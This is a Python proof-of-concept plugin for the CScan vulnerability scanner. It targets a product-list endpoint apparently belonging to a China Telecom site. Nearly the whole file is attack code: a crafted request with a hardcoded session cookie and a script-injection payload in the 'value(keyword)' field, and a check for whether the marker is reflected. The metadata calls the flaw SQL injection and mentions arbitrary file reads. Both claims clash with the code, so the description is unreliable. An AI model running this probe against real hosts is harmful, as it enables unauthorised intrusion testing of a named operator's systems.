# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = '189_0111'  # 平台漏洞编号
    name = '中国电信存在SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-03-05'  # 漏洞公布时间
    desc = '''
    中国电信存在SQL注射漏洞，攻击者可以通过任意文件下载来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=170889
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '189(电信)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '614be7f9-d328-4188-a5c0-136b4b9afffa'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/extpmsPdtInfo.do?action=list"
            headers = {
                'Content-Length': '234',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'http://**.**.**.**:80/zgLoginAction.do',
                'Cookie': 'JSESSIONID=A5C98CCF4A7C81CC4A3438C86412A367; rayvwulm=1',
                'Host': self.target,
                'Connection': 'Keep-alive',
                'Accept-Encoding': 'gzip,deflate',
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21',
                'Accept': '*/*'
            }
            data = {
                'BRAND': "&CHIP=&CONSUME_GROUP=&input=1&OS=&PDT_TYPE=&searchType=&SKSD=&value(keyword)=1'%22()%26%25<acx><ScRiPt%20>alert（“/Cscan-hyhmnn/”）</ScRiPt>&value(orderByStr)=&value(SALE_PRICE)=&value(SCREEN_SIZE)=&value(select_value)=&value(withPeomote)="
            }
            url = self.target + payload
            response = requests.get(url, headers=headers, data=data)
            if "/Cscan-hyhmnn/" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
